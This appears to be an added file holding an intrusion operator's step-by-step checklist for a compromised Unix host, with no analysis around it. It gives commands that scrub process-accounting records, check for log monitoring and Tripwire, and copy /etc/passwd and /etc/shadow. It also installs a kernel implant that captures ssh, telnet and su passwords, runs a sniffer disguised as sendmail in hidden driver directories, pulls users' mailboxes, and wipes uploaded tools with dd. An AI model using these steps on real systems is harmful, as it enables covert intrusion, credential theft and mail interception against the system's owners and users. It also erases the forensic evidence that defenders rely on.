+   no options:  print all entries to stdout and exit
+
+   -h(elp):     self expl 
+
+   -e:          list null entries; all other select criteria ignored
+
+   -f fname:    delete whitespace-separated numeric entries
+                listed in "fname"
+                (numbers must be in numeric order -- try the
+                "sort -n" option if necessary) 
+
+   -r:          list entries w/ gid == root
+
+   -i           calculate # of entries in the file
+                (all other selection options ignored)
+
+   -l num_hrs   list entries whose start time was within last num_hrs hours
+
+   -n numeric_list:  select numeric ranges and/or individual entries
+                     (numeric list CANNOT have spaces and MUST be
+                     in numeric order and comma-separated) 
+                     e.g.: -n 1-1024,1080,6666,31337 
+                     ** NOTE:  USING EITHER THE -n OR -L OPTION CAN 
+                     ** SIGNIFICANTLY IMPROVE PROCESSING TIME
+
+   -L number:        select the last number of entries
+                     ** NOTE:  USING EITHER THE -n OR -L OPTION CAN 
+                     ** SIGNIFICANTLY IMPROVE PROCESSING TIME
+
+   -k numeric_list:  slower version of -n (doesn't use lseek) 
+
+   -t time_range:   entries that fall within time range, specifed
+                    as [[CC]YY]MMDDhhmm[.SS]-[[CC]YY]MMDDhhmm[.SS]
+                    (no spaces) 
+                    e.g. 8 Jul 1999 from 10am to 11am: 
+                         -t 199907081000-199907081100 
+
+   -c cmd_name:     strncmp() search for 1st 8 chars of commands that 
+                    match cmd_name
+
+   -s "cmd1|cmd2|...":    strncmp() search for 1st 8 chars 
+                          of commands that DO match a list of '|' 
+                          separated strings (kinda like egrep) 
+
+   -S "cmd1|cmd2|...":    strncmp() search for 1st 8 chars 
+                          of commands that DON'T match a list of '|' 
+                          separated strings (kinda like egrep -v) 
+
+
+
+### LOCALLY, make pclean dir
+-lsh mkdir /current/down/pclean
+
+### Make sure your path is correct:
+### redo path with WORKINGDIR
+-addpath .
+
+### or equivalently:
+### DEC:
+#-setenv PATH=/usr/.advtags:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc:/usr/ucb
+
+### OTHER:
+#-setenv PATH=/tmp/WORK_DIR:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc:/usr/ucb
+
+
+### newer way
+
+#### Checks number of processes in file? Informational
+#### This one doesn't do any cleaning yet.
+sendmail -i; date
+
+### This works for ICESKATE (DEC)
+#sendmail -r -l 4 -S "sendmail|imapd|idled|mail.lo|popper|sshd|in.ident|syslogd|telnetd|ipop3d|imapd" > T:/current/down/pclean/o
+## safest way for SPARC
+sendmail -l 4 > T:/current/down/pclean/o
+
+### Locally, edit file and remove any excess entries
+### Use following on local host to convert into input format:
+cp o o.orig
+
+### Delete header and footer lines, along with any processes that 
+### don't appear to be us
+vi o
+
+### Convert the file into input format (process ref numbers only): OR in vi:   :%s/ .*//g
+cut -f1 -d ' ' o > i
+        # or
+cut -f1 -d ' ' o.grep > i
+
+### Verify the file to be uploaded is correct:
+cat i
+
+### upload input file
+-put /current/down/pclean/i i
+-ls
+
+### DON'T RUN ANY MORE NON-BUILTIN COMMANDS ON TARGET AFTER THIS COMMAND!!!!!
+### Delete our entries
+sendmail -d -f i > T:/current/down/pclean/o.after
+
+### Locally, edit file and remove any excess entries
+### verify pclean worked:
+cat o.after
+
+### Paste the final 'sendmail' cleanup line from o.after on the target
+### until it says "no entried selected"
+
+### Extra cleanup
+
+### reset timestamp on /usr after rm /usr/.advtags
+-rm sendmail i
+
+
+###  DO NOT RUN ANY MORE NON-BUILTIN COMMANDS or you'll HAVE TO PCLEAN AGAIN!!!!
+
+
+######################################################################################
+
+
+###  check logs
+#grep 217.53.1.2 /var/adm/SYSLOG /var/log/syslog
+
+grep PITCH_IP /var/adm/SYSLOG /var/log/syslog /var/adm/messages
+
+### Get a reboot history through a combination of the following:
+### Take note if anyone was on the console around the time of any reboots
+last | egrep "down|boot|console"
+last -15 boot
+
+-tail /var/adm/sulog
+
+#### CHECK FOR ACCOUNTING...
+-ls  /var/adm/*acct
+-ls -t /var/spool/cron/crontabs 
+grep acct /var/spool/cron/crontabs/*
+-ls  /var/spool/cron/atjobs 
+grep acct /var/spool/cron/atjobs/*
+
+#### (1) What's the current local time?
+### (2) Is the platform close to what we thought?
+### (3) Do we have some available disk space?
+### (4) Are there currently any at jobs?
+date; uname -a; df -k; at -l
+
+### check for remote monitoring
+#-ls -t /var/adm/syslog.dated
+#-ls -t /var/adm/syslog.dated/current/
+#-tail -70 /var/adm/syslog.dated/current/auth.log
+#-tail -70 /var/adm/syslog.dated/current/daemon.log
+#-tail -70 /var/adm/syslog.dated/current/mail.log
+#-tail -70 /var/adm/syslog.dated/current/others.log
+#egrep "PITCH_IP|inetd| ident" /var/adm/syslog.dated/current/*.log
+
+
+### check other logs
+-ls -t /var/adm
+-ls -t /var/log
+
+
+####### LINUX TECH CHECKS:
+hostname
+=mkoffset
+-ifconfig
+
+###  Looking for libint.so in maps:
+-ls /proc/1/
+cat /proc/1/maps
+
+### check access times:
+-lt /lib/libinit.so
+-ls -u /lib/libinit.so
+
+### should NOT exist:
+-lt /etc/ld.so.preload
+
+
+### see if lock file is there, pull if not too big:
+-lt /var/spool/lpd/_default
+	-get /var/spool/lpd/_default/<lockname>
+
+
+### check reboots:
+-ls -t /var/log/*ksym*
+
+### check logs around time of last callback:
+-ls -t /var/log/mess*
+	-get /var/log/mess*
+
+### pull this (should compress well):
+-lt /var/log/lastlog
+	-get /var/log/lastlog
+
+-ls -t /root
+-get -v /root/.bash_history
+
+
+
+############# For LINUX
+-ls /var/spool/cron
+-ls /var/run/utmp
+-ls /var/log/wtmp
+
+netstat -an
+netstat -anlp
+
+###### shows dates of reboots:
+-lt /var/log/ksyms*
+
+### Like uname -a
+-cat /etc/*release
+uname -a
+
+### Like psrinfo -v:
+cat /proc/cpuinfo
+
+	# Kernel info - vmlinux
+stat /dev
+stat /sbin/init
+-lt /boot
+-get /boot/System.map*
+-lt /etc
+-get /etc/lilo.conf
+mount
+-ls /sbin/init
+cksum /sbin/init
+lsmod
+-ls /sbin
+ls -l /proc/1/exe
+-ifconfig
+netstat -npa
+
+	# For SS
+/proc/config.gz
+/boot/config-`uname -r`
+/proc/version
+/usr/src/linux-`uname -r`/.config
+/usr/src/linux-`uname -r`/configs/*.config
+
+	# For JL
+rpm -qa |grep xinet
+-strings /usr/sbin/xinetd |grep Version
+-get /usr/sbin/xinetd
+-ls /etc/xinetd.conf
+grep "disable" /etc/xinetd.d/*
+chkconfig --list
+
+
+
+########  END FORENSICS ##########################
+
+############- Create our slash and burn at job
+
+cd /; echo "rm -rf /tmp/.scsi > /dev/null 2>&1" | at now + 180 minutes
+cd /; echo "kill -9 ###FINSPID### > /dev/null 2>&1" | at now + 180 minutes
+at -l; date
+
+### vi commands to (1) mark, (2) modify file for at job, (3) jump back here
+mx
+:%s/at -r ### /at -r  /g
+`x
+
+### redo path with WORKINGDIR
+-setenv PATH=/tmp/.scsi:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc:/usr/ucb
+
+### What protocols are serviced by 'inetd'...
+grep -v "^#" /etc/inetd.conf
+
+### Which facilities and levels are getting logged to which files/hosts...
+grep -v "^#" /etc/syslog.conf
+
+### Named config files
+-ls /etc/named*
+-ls /var/named*
+
+
+
+### ASET (Automated Security Enhancement Tool) CHECK...
+### 
+### After connecting and creating/cd-ing to your "working
+### directory" in /tmp
+
+grep aset /var/spool/cron/crontabs/*
+
+### if aset if running, look for path after the "-d" option
+### i.e. 0 0 * * * /usr/aset/aset -d /usr/aset
+###      /usr/aset would be the path we're looking for
+### if this path is _not_ /usr/aset, run the following commands
+### as is AND a second time replacing /usr/aset with the path
+### from the cron job
+
+#ls -al /usr/aset
+#ls -al /usr/aset/reports/latest
+
+### ASET Tasks...
+#ls -al /usr/aset/tasks
+#tar cvf as.t /usr/aset/tasks; ls -la
+
+#### ASET Archives...
+#ls -al /usr/aset/archives
+#tar cvf as.a /usr/aset/archives; ls -la
+
+#### ASET Master Files...
+#ls -al /usr/aset/masters
+#tar cvf as.m /usr/aset/masters; ls -la
+
+#### Download any ASET tar files and remove from tmp dir on target
+
+
+
+################  Locally, look thru find ################################
+
+#### Typical grep's on downloaded 'find' file
+#### Do on local host after downloading files.  Collectively...
+
+cd /current
+
+egrep '(tftpboot|cisco|router|hack|\.\.\.|tacac|ssh)' *m
+	## or, singly...
+grep cgi-bin *m
+grep tftpboot *m
+grep cisco *m
+grep router *m
+grep hack *m
+grep "\.\.\." *m
+grep ssh *m
+grep tac *m |egrep '(passwd|pwfile|etc|wtmp|conf|plus)'
+
+#### Since we're looking at 'find', TRIPWIRE could be elsewhere, too...
+#### Collectively...
+egrep '(trip|twz|tw\.config)' *m
+	# or, singly...
+grep trip *m
+grep twz *m
+grep "tw\.config" *m
+
+### look for history files
+grep history *m
+
+
+### Extra -local window 
+
+#lsstamp -c 2 -s sorts based on atime (good for finding config files)
+#lsstamp -c 3 -s sorts based on ctime (good for finding hacker activity)
+
+# OR
+
+# ./mkfinds -h
+# ./mkfinds
+
+###################################################################################
+###################################################################################
+
+### PASSWD FILE?
+# get -l option will disconnect absolute path locally 
+-ls /etc/passwd /etc/shadow 
+-get -l /etc/passwd /etc/shadow 
+
+#############  MAILGRAB ##############################
+
+# Strifeworld Collection
+
+-setenv PATH=/tmp/.scsi:/usr/bin:/bin:/usr/sbin:/sbin:/usr/local/bin
+ 
+who -b
+
+######################################################
+# SUCTIONCHAR
+######################################################
+#     32 or 64 bit OS - solaris sparc 8,9
+#       Kernel level implant - transparent, sustained, or realtime
+#       interception of procoess input/output vnode traffic.
+#       retrieve later
+
+#       filter: ssh, telnet, rlogin, rsh, password, login, csh , su
+
+#  max bytes collected per session is 32 kilobytes
+#  max bytes collected for all sessions is 1 megabyte
+#  don't take up more than 1% of system's memory
+
+#  to determine if suctionchar is loaded on a system is to
+#  open a command channel to the implant as described in
+#  authenticate and yyserv tool and demo sections.  If this
+#  fails and receives the error "Bad Address" when trying to
+#  modload the instant grat module;  function call needs patch
+#  can't be found, probably because already been patched by a
+#  version of suctionchar already running
+
+#  SUCTIONCHAR will go away at reboot
+#  if offset involved with target, must set op box time to match target time
+
+#  INSTALLING SUCTIONCHAR
+uname -a
+isainfo -v
+
+-cd /tmp/.scsi
+
+cp /usr/sbin/modload ml
+cp /usr/sbin/modinfo mi
+
+### if running 32 AND 64 bit, upload 64 bit:
+# 64 bit
+-put /current/up/sparcv9/sum sum
+# else 32 bit
+-put /current/up/sum sum
+
+-lt sum
+### install it:
+./ml sum
+
+### make sure sum doesn't show up in modinfo:
+./mi
+
+### note size of sum for dd command:
+-lt sum
+
+### Run dd to zero out 'sum' binary so its contents can't be recovered from disk after deletion
+#
+# say size of sum is 34364, need for count in dd
+#
+
+dd bs=1 count=34364 if=/dev/zero of=sum
+-rm sum ml mi
+
+### nothing should have logged:
+-tail /var/adm/messages
+
+##### NOPEN SUCTIONCHAR COMMANDS ########
+[-suc]
+Usage: -suc [get|<filename>] | [-s] <pid> [<pid>..] | blow | info | filter | free | unhook
+
+-suc info          # shows if installed and bytes collected, max s and max c
+-suc filter        # set filters /current/etc/suctionchar.sample.conf
+# locally to give pastable for -suc filter:
+# make filter.conf file
+
+/current/bin/suctionchar.genconf /current/etc/suctionchar.sample.filter.conf
+# paste filter in one at a time from genconf bottom output until all filters
+# in; filter saved message appears
+
+-suc get           # get data, decrypt, view
+-suc blow          # remove suctionchar
+-suc -s pid [pid]  # on the fly tracking of process to screen
+-suc free          # free memory of suctionchar data
+-suc unhook        # unhook any realtime process with -s to screen
+
+# on target:  to authenticate must run yyserv on target and
+#      /current/etc/suctionchar.authenticate locally
+#  authenticate by hand, our opbox time must be set exactly to authenticate
+cp /bin/cat yyserv
+-shell
+echo $$                 #  notice pid
+./yyserv                # <ctrl><c> to exit
+# 1 -- copy magic string from local authenticate window
+# 3 -- copy first response from local authenticate window
+# 5 -- copy second response from local authenticate window
+info
+OK
+info
+
+exit
+
+# locally
+cd /current/bin
+./suctionchar.authenticate
+# 2 -- place PID from echo $$ on target (-shell)
+# 4 -- challenge= copy from yyserv output string inbetween first response string
+
+
+# yyserv commands
+# info - stats on collected sessions
+info
+# filt - reprogramming the filter rules it is running; intended to only be
+#   used with commands generated by genconf
+filter
+# copy filters one by one based on local genconf output
+# file - writes out collected data to disk; file name in double quotes
+#  ex: "/tmp/filename"; should receive ERROR if wrong, WROTE to "/tmp/filename"
+file "/tmp/.scsi/d
+# in nopen window not running yyserv
+-get /tmp/.scsi/d
+-rm /tmp/.scsi/d
+# locally
+/current/etc/suctionchar.decrypt PATH/d outfile
+# free - deallocates memory to store collected data; should always get OK
+free
+# hook - realtime snooping of existing processes
+#  ex:  hook PID
+# unho - unhooking any realtime hooked processes
+# sets - set maximum bytes collected per session (MAX S =)
+# setc - set maximum total bytes, across all collected sessions, used to
+#        store data in memory (MAX C =)
+# unpa - unpatch itself from the kernel
+# exit - send kill to yyserv
+
+#  when finished using yyserv manually, make sure cleaned up properly
+ps -ef | grep yyserv
+
+-lt
+-rm yyserv
+-cd /tmp
+-rm /tmp/.scsi
+
+
+######################################################
+# WATCHER
+######################################################
+
+
+
+
+
+######################################################
+# STRIFEWORLD
+######################################################
+
+###
+###  IMPORTANT: make note of PID,PPID that strifeworld reports when you start it and save it in opnotes
+###
+
+### man page:
+cd /current/etc
+nroff -man strifeworld.1
+
+
+############  Start STRIFEWORLD #####################
+
+### upload strifeworld as sendmail (or something else that might blend in)
+
+-put /current/up/strifeworld sendmail
+
+
+
+### Sniffing syntax:
+
+#PATH=. E="port 23 and host (210.56.16.1 or 210.56.4.1)" C="-o/tmp/.nfs7254 -n. -ihme0 -a3000 -b10000 -x100" sendmail
+#PATH=. E="port 23" C="-o/tmp/.nfs7254 -n. -ihme0 -a3000 -b10000 -x100" sendmail
+
+
+
+### Task mail:
+
+#PATH=. E="port 25" C="-o/tmp/DIR -f(user1 user2) -ihme0 -a3000 -b100000 -j10000000" sendmail
+#PATH=. E="port 25" C="-o/tmp/DIR -f([^a-zA-Z0-9_-](user1|user2|user3)@) -ihme0 -a3000 -b100000 -j10000000" sendmail
+#PATH=. E="port 25" C="-o/platform/SUNW,SystemEngine/kernel/drv/scsi -f([^a-zA-Z0-9_-](user1|user2|user3)@) -ihme0 -a3000 -b100000 -j10000000 -x100 -l" sendmail
+
+
+### Dump to hidden directory:
+
+### to hide on a sparc system
+-lt platform/SUNW,SystemEngine/kernel/drv
+PATH=. E="port 23" C="-m -o/platform/SUNW,SystemEngine/kernel/drv/.scsi -n. -i iprb0 -a3000 -b10000 -x100 -l" sendmail
+
+### to hide file on an x86 system
+-lt /platform/dvri86pc/kernel/drv
+PATH=. E="port 23" C="-m -o/platform/dvri86pc/kernel/drv/.scsi -n. -i iprb0 -a3000 -b10000 -x100 -l" sendmail
+
+
+
+
+###  make note of PID,PPID it echos back and document the command used to start it
+
+
+
+### verify it's running and hidden:
+
+ps -ef | grep PID
+cd /dev; ps -ef |grep " sendmail"
+
+        # or
+
+echo "p\nq\n"|crash|grep sendmail       #  Should see sendmail with <PID>.
+echo "p\nq\n"|crash|grep PID            #  Should see sendmail with <PID>.
+
+
+
+############  Dump STRIFEWORLD #####################
+
+### first, change local dir to either mailpull or sniffer:
+
+-lcd /current/down/sniffer/TARGET_NAME.TARGET_IP
+-lcd /current/down/mailpull/TARGET_NAME.TARGET_IP
+
+
+
+### dump via built-in:
+
+=swkill
+
+
+
+
+### dump by hand:
+
+### figure out sw PID and replace it in line below:
+
+#A=PID export A; kill -USR1 $A; sleep 1;kill -USR2 $A;sleep 1; kill -USR1 $A;sleep 1;kill -USR2 $A
+
+-ls -t /tmp
+-get -l /tmp/file1 /tmp/file2
+-rm /tmp/file1 /tmp/file2
+-ls -t /tmp
+
+### or if in a hidden directory (filename usually 'scsi'):
+
+-ls /platform/SUNW,SystemEngine/kernel/drv/scsi
+-ls /platform/dvri86pc/kernel/drv/scsi
+-get -l FILENAME
+cat /dev/null > FILENAME
+-lt /platform/SUNW,SystemEngine/kernel/drv
+-lt /platform/dvri86pc/kernel/drv
+
+
+
+
+######### To grep headers from strifeworld mail collection:  ##############
+
+wc -l /tmp/file1 /tmp/file2
+
+### while on target:
+
+#P0=[12]?[0-5]?[0-9]+\\. ; P1=[0-9]+ ; P2=$P0$P0$P0$P0$P1 ; egrep -ni "($P2-$P2|^To:|^From:|^Subject:|filename=)" /tmp/.nfs6218
+
+### when done locally:
+
+#P0=[12]?[0-5]?[0-9]+\\. ; P1=[0-9]+ ; P2=$P0$P0$P0$P0$P1 ; egrep -ni "($P2-$P2|^To:|^From:|^Subject:|filename=)" /current/down/mailpull/TARGET_NAME.TARGET_IP
+
+
+
+ 
+#############  MAILGRAB ##############################
+### Multiple mail pulls
+
+
+-lcd /current/down/mailpull/TARGET_NAME.TARGET_IP
+
+##### or use -chili
+#
+-chili -s 1 -l mm-dd-yyyy /var/mail USER1
+
+## after down, check size locally
+cd /current/down/mailpull/TARGET_NAME.TARGET_IP
+
+
+# look at SA mail
+
+-tail /var/adm/sulog
+
+-ls /var/mail/USER
+
+grep -n -i "^Subject: " /var/mail/USER
+
+
+### Generic stuff
+
+### SUBJECT/DATE/FROM/TO/E-MAIL ATTACHMENTS Normal...
+#cd /var/mail; egrep '(^Subject:|^Date:|^From:|^To:|name=)' *
+
+
+###############  Get ready to cleanup ###################################
+
+### redo path with WORKINGDIR
+-setenv PATH=/tmp/WORK_DIR:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc:/usr/ucb
+
+
+############- ZAP OUR AT JOB
+
+at -l
+at -r ### ; at -l
+
+
+############  HEALTH CHECK  #########################
+
+###  Run the following before pcleaning to baseline system health prior
+###  to end of op
+
+w; date; last -80
+/sbin/ps -elf; swap -l; uptime
+ps -ef |grep " sendmail"
+-pid
+df -k
+-ls -t / 
+-tail -50 /var/adm/messages
+-ls -t /var/log /var/cron /var/adm
+
+
+####
+### Clean up and Bail
+####
+
+### Remove working dir, reset timestamp, rm touchfile, verify /usr and /tmp
+### then 
+-cd /tmp
+-rm /tmp/WORK_DIR
+YES
+
+-ls /tmp
+
+
+####
+## Kill off all remote nopen server processes...
+####
+
+-burn
+BURN
+
+#### Try reconnecting to make sure noserver died
+
+
+###### End of user.mission; You're done!!!! ########################
